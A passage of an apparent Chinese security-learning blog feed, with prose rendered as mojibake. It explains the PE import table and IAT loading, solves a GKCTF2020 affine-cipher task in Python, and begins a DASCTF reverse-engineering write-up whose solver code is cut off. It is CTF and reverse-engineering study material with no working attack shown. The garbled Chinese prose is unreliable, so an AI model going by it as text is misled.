<strong>00054EFC</strong>. æœ€åé€šè¿‡ ODè½½å…¥ODçœ‹ä¸€ä¸‹.<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161939914-1590826622691.png" alt="image-20200510161939914"></p><p>  <strong>ä»è¿™é‡Œä¹Ÿè¯´æ˜äº†, .exeæ–‡ä»¶ä¹Ÿæ˜¯å¯èƒ½æœ‰è¾“å‡ºè¡¨çš„</strong></p><hr><h2 id="0x6-IMAGE-IMPORT-DESCRIPTOP-è¾“å…¥è¡¨"><a href="#0x6-IMAGE-IMPORT-DESCRIPTOP-è¾“å…¥è¡¨" class="headerlink" title="0x6 IMAGE_IMPORT_DESCRIPTOP è¾“å…¥è¡¨"></a>0x6 IMAGE_IMPORT_DESCRIPTOP è¾“å…¥è¡¨</h2><p><strong>è®°å½•PEæ–‡ä»¶è¦å¯¼å…¥é‚£äº›åº“æ–‡ä»¶  DataDirectory[1]è®°å½•äº†RVAåŠSize.</strong></p><p><strong>é¦–å…ˆ, æ‰§è¡Œä¸€ä¸ªç¨‹åºä¼šæœ‰å¾ˆå¤šçš„å‡½æ•°æ˜¯å…¬ç”¨çš„,åœ¨åŠ¨æ€é“¾æ¥åº“é‡Œ(åŠ¨æ€é“¾æ¥åº“, .dllæ–‡ä»¶æ€»æ˜¯é™„åŠ åœ¨ä¸€ä¸ªè¦æ‰§è¡Œçš„ç¨‹åºä¸­, .dllæ–‡ä»¶ä¸­æœ‰è¯´æ˜åº“EATçš„è¾“å‡ºè¡¨), å¦‚ä¸‹å›¾, ä¸€ä¸ªç¨‹åºåŠ è½½çš„éƒ¨åˆ† .dllæ–‡ä»¶.</strong><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200518132004979-1590826622691.png" alt="image-20200518132004979"></p><p><strong>æˆ‘ä»¬çš„è¾“å…¥è¡¨è®°å½•äº†éœ€è¦ç”¨åˆ°çš„å‡½æ•°åç§°, é€šè¿‡åœ¨åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ä¸­æœç´¢è¯¥å‡½æ•°å¾—åˆ°å®é™…çš„RVA, å†è®°å½•åˆ°è¾“å…¥è¡¨ä¸­, ä¾›ç¨‹åºä½¿ç”¨.   å¦å¤–æ‰§è¡Œä¸€ä¸ªæ™®é€šçš„ç¨‹åºä¸€èˆ¬éœ€è¦å¤šä¸ªåº“, é‚£å¯¼å…¥å¤šå°‘åº“, å°±ä¼šæœ‰å¤šå°‘ä¸ªè¾“å…¥è¡¨ç»“æ„ä½“. è¿™å°±æ„æˆäº†ç»“æ„ä½“æ•°ç»„ä¸”ç»“æ„ä½“æ•°ç»„æœ€åä»¥ NULL ç»“æŸ (å³æ¯ä¸ªå¯¼å…¥çš„ DLL éƒ½ä¼šæˆä¸ºæ•°ç»„ä¸­çš„ä¸€é¡¹).</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics</span><br><span class="line">    <span class="comment">// ç”±äºæ˜¯ä¸€ä¸ªè”åˆ, å¦‚æœè¿™æ˜¯è¯¥ç»“æ„ä½“æ•°ç»„çš„æœ€åä¸€</span></span><br><span class="line">    <span class="comment">// é¡¹, é‚£ä½¿ç”¨ Characteristicsæˆå‘˜,ä¸”å€¼ä¸º 0</span></span><br><span class="line">    <span class="comment">// å¦åˆ™ä½¿ç”¨ä¸‹é¢ä¸€ä¸ªæˆå‘˜</span></span><br><span class="line">        </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    <span class="comment">// INT(import name table)ç»“æ„ä½“æ•°ç»„çš„RVA</span></span><br><span class="line">    <span class="comment">// æ•°ç»„æ¯ä¸ªæˆå‘˜è®°å½•äº†è¦ä½¿ç”¨å‡½æ•°åç§°ä¸åºå·</span></span><br><span class="line">        </span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;                  </span><br><span class="line">    <span class="comment">// æ˜ è±¡ç»‘å®šå‰ï¼Œè¿™ä¸ªå€¼æ˜¯0ï¼Œç»‘å®šåæ˜¯å¯¼å…¥æ¨¡å—çš„æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="comment">// æ®è¯´å¯ä»¥ç”¨æ¥ç¡®å®šè¾“å…¥è¡¨æ˜¯å¦ç»‘å®šä»è€Œæ˜¯å¦éœ€è¦é‡å®šä½</span></span><br><span class="line"> </span><br><span class="line">    DWORD   ForwarderChain;                 </span><br><span class="line">    <span class="comment">// ä¸­è½¬é“¾, è¾“å…¥å‡½æ•°åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªä¸­è½¬çš„ã€32ä½çš„ç´¢å¼•</span></span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰è½¬å‘é“¾, å€¼ä¸º -1</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">// DLLæ–‡ä»¶çš„åç§°ï¼ˆ0ç»“å°¾çš„ASCIIç å­—ç¬¦ä¸²ï¼‰çš„32ä½çš„RVA, </span></span><br><span class="line">    <span class="comment">// æ‰€ä»¥ä¸€ä¸ªå¯¼å…¥æ¨¡å—å¯¹åº”ä¸€ä¸ªè¿™æ ·çš„æ•°ç»„</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">    <span class="comment">//IAT(import address table)ç»“æ„ä½“æ•°ç»„çš„RVA</span></span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¸Šé¢çš„ OriginalFirstThunk(INT), FirstThunk(IAT) æˆå‘˜åœ¨PEæ–‡ä»¶åŠ è½½å‰ä¸€èˆ¬æ˜¯éƒ½åŒæ—¶æŒ‡å‘ç›¸åŒåœ°å€çš„ IMAGE_THUNK_DATA æ•°ç»„.ä¸‹é¢æ˜¯ IMAGE_THUNK_DATA32çš„å®šä¹‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//ä¸€ä¸ªè”åˆ, æ‰€ä»¥æ„å‘³ç€æ¯æ¬¡åªèƒ½ä½¿ç”¨ä¸€ä¸ªæˆå‘˜</span></span><br><span class="line">    <span class="keyword">union</span> </span><br><span class="line">    &#123;</span><br><span class="line">        DWORD ForwarderString;</span><br><span class="line">        <span class="comment">// ä¸­è½¬é“¾,ä¸€ä¸ªDLLæ–‡ä»¶èƒ½è¾“å‡ºä¸å®šä¹‰åœ¨æœ¬DLLæ–‡ä»¶ä¸­å´éœ€ä»å¦ä¸€ä¸ª</span></span><br><span class="line">        <span class="comment">// DLLæ–‡ä»¶ä¸­çš„å‡½æ•°.</span></span><br><span class="line">        </span><br><span class="line">        DWORD Function;</span><br><span class="line">        <span class="comment">// å‡½æ•°çš„åœ°å€</span></span><br><span class="line">        </span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        <span class="comment">// å‡½æ•°çš„åºæ•°. ç”±äºæ‰€æœ‰æˆå‘˜éƒ½æ˜¯åŒä¸€ä¸ªåœ°å€, å½“æœ€é«˜ä½ä¸º1æ—¶è¡¨</span></span><br><span class="line">        <span class="comment">// ç¤ºåˆ—è¡¨ä¸­æ²¡æœ‰å‡½æ•°çš„åå­—ä¿¡æ¯, åªèƒ½é€šè¿‡æœ¬åºæ•°æŸ¥æ‰¾å‡½æ•°,</span></span><br><span class="line">        <span class="comment">// ç”¨ä½16ä½è¡¨ç¤ºçš„åºæ•°, å› ä¸ºæœ€é«˜ä½ä½œä¸ºæ ‡å¿—äº†ã€‚</span></span><br><span class="line">        </span><br><span class="line">        DWORD AddressOfData;</span><br><span class="line">        <span class="comment">// åŒä¸Š, ç”±äºæ‰€æœ‰æˆå‘˜éƒ½æ˜¯åŒä¸€ä¸ªåœ°å€, å½“æœ€é«˜ä½ä¸º0æ—¶, åˆ™ä½¿ç”¨</span></span><br><span class="line">        <span class="comment">// æœ¬æˆå‘˜,ç”¨ä½31ä¸ºè¡¨ç¤º _IMAGE_IMPORT_BY_NAMEç»“æ„çš„RVA</span></span><br><span class="line">        </span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¸Šé¢ä»‹ç»çš„ AddressOfDataæˆå‘˜çš„ä½<span class="number">31</span>å°±è®°å½•æŒ‡å‘ä¸‹é¢æ‰€ç¤ºçš„ _IMAGE_IMPORT_BY_NAME ç»“æ„ä½“æ•°ç»„çš„åœ°å€(RVA), æ•°ç»„ä¸­æ¯ä¸ªæˆå‘˜çš„å‰<span class="number">2</span>ä¸ªå­—èŠ‚æ˜¯å‡½æ•°çš„åºæ•°, åé¢è·Ÿç€é•¿åº¦ä¸å®šçš„å‡½æ•°åç§°çš„å­—ç¬¦ä¸².</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Hint;</span><br><span class="line">    <span class="comment">// å‡½æ•°çš„åºæ•°(å³ç´¢å¼•, ä¸è¾“å‡ºè¡¨ä¸­è®²çš„ä¸€æ ·)</span></span><br><span class="line">    BYTE Name[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// å‡½æ•°åç§°æ•°ç»„,è®°å½•å‡½æ•°çš„åç§°. æ•°é‡æœªå®šä¹‰å³é•¿åº¦ä¸å®š.</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><strong>æ³¨: ä¸Šé¢æ‰€è®²çš„ OriginalFirstThunk æˆå‘˜(æŒ‡é’ˆæ•°ç»„)çš„å€¼æ˜¯ä¸èƒ½æ”¹å†™çš„, é€šè¿‡å®ƒå¯»æ‰¾å‡½æ•°çš„åç§°.   è€Œ FirstThunk æˆå‘˜(æŒ‡é’ˆæ•°ç»„)çš„å€¼åœ¨PEæ–‡ä»¶åœ¨è¢«PEè£…è½½å™¨æ—¶, PEè£…è½½å™¨ä¼šé€šè¿‡ OriginalFirstThunk å¾—åˆ°å‡½æ•°çš„åç§°æˆ–è€…åºæ•°, ç„¶åé€šè¿‡å‡½æ•°åç§°åœ¨åŠ è½½çš„.dllæ–‡ä»¶çš„è¾“å‡ºè¡¨ä¸­æ‰¾åˆ°å‡½æ•°çš„å®é™…åœ°å€, ç„¶åæ›¿æ¢åˆ°FirstThunkçš„ä¸€ä¸ªå€¼.  è£…è½½å®Œæˆå,  FirstThunk æ•°ç»„å°±æŒ‡å‘å‘äº†å‡½æ•°å®é™…çš„åœ°å€.</strong>  å¦å¤–ä¸Šé¢çš„ <strong>TimeDateStamp</strong> æˆå‘˜å¯ä»¥ç”¨æ¥ç¡®å®šè¾“å…¥è¡¨æ˜¯å¦ç»‘å®šä»è€Œæ˜¯å¦éœ€è¦é‡å®šä½, å¦‚æœå®ƒçš„å€¼æ˜¯0, é‚£ä¹ˆè¾“å…¥åˆ—è¡¨æ²¡æœ‰è¢«ç»‘å®š, åŠ è½½å™¨æ€»æ˜¯è¦ä¿®å¤è¾“å…¥è¡¨.  å¦åˆ™è¾“å…¥è¢«ç»‘å®š, ä½†è¯¥æ—¶é—´æˆ³çš„å€¼å¿…é¡»å’Œ.dllæ–‡ä»¶å¤´ä¸­ <strong>TimeDateStamp</strong> çš„ä¸€æ ·, å¦‚æœä¸ä¸€æ ·, ä»ä¼šä¿®æ­£è¾“å…¥è¡¨, å°±ä¼šè¿›è¡Œä¸‹é¢çš„æ­¥éª¤.</p><blockquote><p><strong>å¯¼å…¥å‡½æ•°è¾“å…¥åˆ° IAT çš„é¡ºåº</strong>  </p><p><strong>1.è¯»å– _IMAGE_IMPORT_DESCRIPTORä¸­çš„nameæˆå‘˜, è·å–åº“åç§°å­—ç¬¦ä¸². å¦‚(user32.dll)</strong></p><p><strong>2.è£…è½½ç›¸åº”çš„åº“. LoadLibrary(â€œuser32.dllâ€)</strong></p><p><strong>3.è¯»å–_IMAGE_IMPORT_DESCRIPTORä¸­çš„ OriginalFirstThunk æˆå‘˜, å¾—åˆ° INTåœ°å€.</strong></p><p><strong>4.é€ä¸€è¯»å– INTä¸­æ•°ç»„çš„å€¼, è·å–ç›¸åº”çš„ IMAGE_IMPORT_BY_NAMEåœ°å€(RVA)</strong></p><p><strong>5.ä½¿ç”¨ IMAGE_IMPORT_BY_NAMEçš„Hint (ordinak/åºæ•°)æˆ–nameé¡¹, è·å–ç›¸åº”å‡½æ•°çš„èµ·å§‹åœ°å€.</strong> </p><p><strong>GetProcAddress(â€œå‡½æ•°åç§°â€)</strong></p><p><strong>6.è¯»å– IAT æˆå‘˜, è·å¾—IATåœ°å€.</strong></p><p><strong>7.å°†ä¸Šé¢è·å¾—çš„å‡½æ•°åœ°å€è¾“å…¥ç›¸åº”çš„IATæ•°ç»„å€¼.</strong></p></blockquote><blockquote><p><strong>8.é‡å¤ æ­¥éª¤ 4 -7, ç›´åˆ°INTç»“æŸ.</strong></p></blockquote><p>  <strong>å›¾ç¤ºä¸€ä¸‹, INT ä¸ IAT å…³ç³» (æŠ€æœ¯å¤ªå·®äº†.png).</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519174651226-1590826622691.png" alt="image-20200519174651226"></p><p>  <strong>ä¸‹é¢å®ä¾‹æŸ¥çœ‹ODç¨‹åºçš„è¾“å…¥è¡¨.</strong></p><p>  1.é¦–å…ˆä»PEæ–‡ä»¶å¯é€‰å¤´çš„ DataDirectory[1].VirtualAdress å¾—åˆ°è¾“å…¥è¡¨çš„RVA: <strong>10D000h</strong> åŠsize: <strong>1c87h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519150821954-1590826622691.png" alt="image-20200519150821954"></p><p>  2.RVA: <strong>10D000h</strong> -&gt; RAW:  <strong>(10D000-10D000+CC400) = CC400h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519151445783-1590826622692.png" alt="image-20200519151445783"></p><p>  3.æ‰¾åˆ°è¾“å…¥è¡¨. è®°å½•ä¸‹å¯¹åº”æˆå‘˜çš„RVA.</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153011688-1590826622692.png" alt="image-20200519153011688"></p><p>  4.æŸ¥çœ‹è¯¥è¾“å…¥è¡¨åç§°: <strong>ADVAPI32,DLL</strong>, RVA: <strong>10D9C8</strong> -&gt; RAW: <strong>(10D9C8-10D000+CC400) = CCDC8</strong> </p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153843705-1590826622692.png" alt="image-20200519153843705"></p><p>  5.æŸ¥çœ‹ <strong>OriginalFirstThunk( INT )</strong>  RVA:<strong>10D0C8</strong> -&gt; RAW: <strong>(10D0C8-10D000+CC400) = CC4C8</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519155230578-1590826622692.png" alt="image-20200519155230578"></p><p>  6.å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æˆå‘˜çš„æœ€é«˜ä½æ˜¯ 0, åˆ™è¯¥å€¼æ˜¯IMAGE_IMPORT_BY_NAMEçš„RVA.(RVA: <strong>10DA33</strong> -&gt; RAW: <strong>CCE33</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519160556676-1590826622692.png" alt="image-20200519160556676"></p><p>  7.æŸ¥çœ‹ FirstThunk( IAT ) RVA: <strong>10D0E4</strong> -&gt; RAW: <strong>(10D0E4-10D000+CC400) = CC4E4</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519163851829-1590826622692.png" alt="image-20200519163851829"></p><p>  8.ä»æ­¥éª¤7å¯ä»¥çœ‹åˆ°, PEè£…è½½å™¨è£…è½½PEæ–‡ä»¶ä¹‹å‰, INTä¸IATå„å…ƒç´ åŒæ—¶æŒ‡å‘ç›¸åŒçš„åœ°å€.</p><p>  9.å†çœ‹ TimeDateStamp æˆå‘˜çš„å€¼ä¸º 0, é‚£å°±æ˜¯è¾“å…¥è¡¨è¢«ç»‘å®š, å¦‚æœä¸è¯¥å¯¹åº” .dll PEæ–‡ä»¶çš„æ–‡ä»¶å¤´çš„ TimeDateStampçš„å€¼ç›¸åŒ,  é‚£è¿™ä¸ªè¾“å…¥è¡¨æ˜¯ä¸éœ€è¦ä¿®æ­£çš„.</p><p>  10.ä»ä¸Šé¢çŸ¥é“ IAT çš„RVA: <strong>10D0E4</strong>.  åº“åç§°: <strong>ADVAPI32,DLL</strong>å¦å¤–ä½¿ç”¨ä¸€ä¸ªODè½½å…¥è¿™ä¸ªODç¨‹åºçœ‹çœ‹. å¯ä»¥çœ‹åˆ°åŠ è½½è¯¥.dllæ–‡ä»¶æ–‡ä»¶çš„RVAæ˜¯ä» <strong>FC0000</strong>å¼€å§‹çš„,  è€ŒæŸ¥çœ‹æœªè¢«PEè£…è½½å™¨è£…è½½å‰çš„çŠ¶æ€, IATçš„RVAæ˜¯ <strong>10D0E4</strong>,æ‰€ä»¥æ˜¾ç„¶è¿™æ˜¯éœ€è¦PEè£…è½½å™¨è£…è½½æ—¶å¯¹è¾“å…¥è¡¨ä¿®æ­£çš„, é‚£ä¹Ÿå¯æ¨å‡ºä»–ä»¬çš„ TimeDateStamp çš„å€¼æ˜¯ä¸åŒçš„</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519164915615-1590826622692.png" alt="image-20200519164915615"></p><blockquote><p>è¾“å…¥è¡¨ä¸è¾“å‡ºè¡¨è”ç³»è¿˜æ˜¯æ¯”è¾ƒå¤§, ç»“åˆèµ·æ¥çœ‹çœ‹æ¸…æ¥šå¾ˆå¤š.</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto</title>
      <link href="/2020/05/29/Crypto/"/>
      <url>/2020/05/29/Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»¿å°„å¯†ç "><a href="#ä»¿å°„å¯†ç " class="headerlink" title="ä»¿å°„å¯†ç "></a>ä»¿å°„å¯†ç </h3><blockquote><p>ä»¿å°„å¯†ç æ˜¯æ˜¯åŠ æ³•å¯†ç ä¸ä¹˜æ³•å¯†ç çš„ç»“åˆã€‚å®ƒä¸€ç§è¡¨å•ä»£æ¢å¯†ç ï¼Œå­—æ¯è¡¨çš„æ¯ä¸ªå­—æ¯ç›¸åº”çš„å€¼ä½¿ç”¨ä¸€ä¸ªç®€å•çš„æ•°å­¦å‡½æ•°å¯¹åº”ä¸€ä¸ªæ•°å€¼ï¼Œå†æŠŠå¯¹åº”æ•°å€¼è½¬æ¢æˆå­—æ¯ã€‚åŠ å¯†åå­—æ¯çš„å¤§å°å†™ä¸å˜çš„ã€‚</p></blockquote><ul><li>åŠ å¯†å‡½æ•°ï¼š<strong>E(x) = (ax + b) (mod m)</strong>ï¼Œå…¶ä¸­aä¸mäº’ä¸ºè´¨æ•°ï¼Œè¿™ä¹Ÿæ˜¯èƒ½æ±‚aé€†æ¨¡çš„å¿…è¦æ¡ä»¶ã€‚</li><li>è§£å¯†å‡½æ•°ï¼š<strong>D(x) = a^-1(x - b)(mod m)</strong>ï¼Œå…¶ä¸­ a^-1ä¸ºaåœ¨Zmç¾¤çš„é€†å…ƒã€‚</li></ul><blockquote><p>å½“ a = 1æ—¶ç›¸å½“äºå‡¯æ’’å¯†ç ï¼Œ å…¶å®æ•´ä¸ªå¯†ç å°±æ˜¯å‡¯æ’’å¯†ç é‚£ç§æ„æ€ï¼Œåªæ˜¯åŠ å¼ºç‰ˆå§ã€‚</p><p>å¯¹äºæ±‚é€†å…ƒå¯ä»¥ç›´æ¥ä½¿ç”¨python gmpy2åº“çš„ invert() æ–¹æ³•ã€‚<a id="more"></a></p></blockquote><p>ä»¥GKCTF2020ä¸­ç¬¬ä¸€é“ Crypto ä½œä¸ºç»ƒæ‰‹ã€‚</p><p><img src="/2020/05/29/Crypto/image-20200529175847900.png" alt="image-20200529175847900"></p><ul><li><p>é¦–å…ˆçŸ¥é“ a = 11ï¼Œb = 6ï¼Œm = 26ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"welcylk"</span>:</span><br><span class="line">    flag += chr(((ord(i)<span class="number">-97</span>)<span class="number">-6</span>)*gmpy2.invert(<span class="number">11</span>, <span class="number">26</span>)%<span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">flag = bytes(flag, encoding = <span class="string">"utf-8"</span>) <span class="comment">#å°†strè½¬åŒ–ä¸ºbyteç±»å‹ã€‚</span></span><br><span class="line">flag = base64.b64encode(flag)<span class="comment">#è¿™é‡Œåªèƒ½ä½¿ç”¨byteç±»å‹ã€‚</span></span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><blockquote><p>pythonä¸­strä¸byteåŒºåˆ«ï¼š</p><p>Python3ä¸¥æ ¼åŒºåˆ†æ–‡æœ¬ï¼ˆstrï¼‰å’ŒäºŒè¿›åˆ¶æ•°æ®ï¼ˆBytesï¼‰ï¼Œæ–‡æœ¬æ€»æ˜¯Unicodeï¼Œç”¨strç±»å‹ï¼ŒäºŒè¿›åˆ¶æ•°æ®åˆ™ç”¨Bytesç±»å‹è¡¨ç¤ºã€‚</p><p>str -&gt; byteï¼š</p><p>s = bytes(s, encoding = â€œutf-8â€)</p><p>s = s.encode()</p><p>s = s.encode(encoding = â€œutf-8â€)</p><p>byte -&gt; strï¼š</p><p>s = str(s, encoding = â€œutf-8â€)</p><p>s = bytes.decode(s)</p><p>s = s.decode()</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´DASCTFäº”æœˆçº¿ä¸Šèµ›</title>
      <link href="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="ViQinere"><a href="#ViQinere" class="headerlink" title="ViQinere"></a>ViQinere</h3><ul><li><p>64ä½elfæ–‡ä»¶, è½½å…¥idaåå‘ç°ä¸ä»¥å¾€çš„ä¸åŒ. å¾ˆå¤šå‡½æ•°éƒ½æ²¡æ˜¾ç¤ºå‡ºæ¥.</p></li><li><p>linuxä¸­è¿è¡Œä¸€ä¸‹, æ˜¾ç¤ºå¯¹flagåŠ å¯†, ç„¶åæ˜¯ä¸€äº›ä¹±ç .  åæ¥ç¾¤é‡Œé€šçŸ¥, è¿™ä¸ªæœ‰é¶æœº.</p></li><li><p>ncè¿æ¥ä¸€ä¸‹, é‚£é¢˜ç›®çš„flagå­˜æ”¾åœ¨æœåŠ¡å™¨, æ–‡ä»¶æ“ä½œå–å‡ºflag, ç»è¿‡åŠ å¯†. <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523203121150.png" alt="image-20200523203121150"></p><a id="more"></a></li><li><p>æ¥ç€å†åœ¨idaä¸­çœ‹ä¸€ä¸‹, æœ‰å‡ ä¸ªå­—ç¬¦å¾ˆæ‡µ, åé¢æ‰å‘ç°å°±æ˜¯æ”¹å˜è¾“å‡ºå­—ç¬¦ä¸²æ ·å¼, è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆlinuxä¸­è¿è¡Œçš„æ—¶å€™ä¼šæœ‰æ¶‚é¸¦ä¸é—ªåŠ¨, <img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204020172.png" alt="image-20200523204020172"></p></li><li><p>ç„¶åæ˜¯è¢«æ¶‚é¸¦çš„é‚£ä¸€æ®µå‘äº†, æ˜¾ç¤º <strong>Flag was encrypted by <a href="http://cc.TaQini.space" target="_blank" rel="noopener">http://cc.TaQini.space</a></strong> , ä¸€ç›´ä»¥ä¸ºåŠ å¯†å’Œè¿™ä¸ªæœ‰å…³,  å—¯â€¦åæ¥å‘ç°æ˜¯é¢˜ç›®ä½œè€…ç»™è‡ªå·±æ‰“çš„å¹¿å‘Š. </p></li><li><p>è™½ç„¶å¾ˆå¤šå‡½æ•°ä¸èƒ½æ˜¾ç¤ºå‡ºæ¥, ä½†ä¹Ÿæ˜¯èƒ½çŒœå‡ºæ¥ä½œç”¨. çœ‹çœ‹æ±‡ç¼–ä¼šæ›´æ¸…æ¥š. </p></li><li><p>æœ€åæ‰¾åˆ°åŠ å¯†å‡½æ•° <strong>sub_1249((__int64)byte_4080);</strong>, è¿™ä¸‹å°±å¥½åŠäº†.   è¿›å»å‡½æ•°å¯ä»¥çŸ¥é“, å¤§å†™å­—æ¯åŠ å¯†ä¸ºå¤§å†™å­—æ¯, å°å†™å­—æ¯åŠ å¯†ä¸ºå°å†™å­—æ¯, å…¶ä»–å­—ç¬¦ä¸å˜.<img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204833774.png" alt="image-20200523204833774"></p></li><li><p>å¯¹äºé€†è¿™ä¸ªç®—æ³•, æ²¡æœ‰è¿‡å¤šçš„æƒ³, ç®—æ˜¯ç›´æ¥ç©·å°½çš„å§(ç®—æ³•å¤ªèœ).  å› ä¸ºå¤§å†™å­—æ¯å˜å¤§å†™å­—æ¯,å°å†™å­—æ¯å˜å°å†™å­—æ¯.</p></li><li><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 